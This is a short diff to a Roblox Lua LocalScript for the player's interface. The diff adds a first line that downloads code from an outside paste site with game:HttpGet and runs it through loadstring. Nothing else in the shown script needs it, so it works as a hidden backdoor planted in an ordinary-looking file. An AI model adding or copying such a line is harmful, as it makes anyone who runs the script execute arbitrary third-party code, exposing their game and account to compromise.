@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Enchz4t1F0/0"))()
+
+
 -- LocalScript: place in StarterPlayerScripts
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
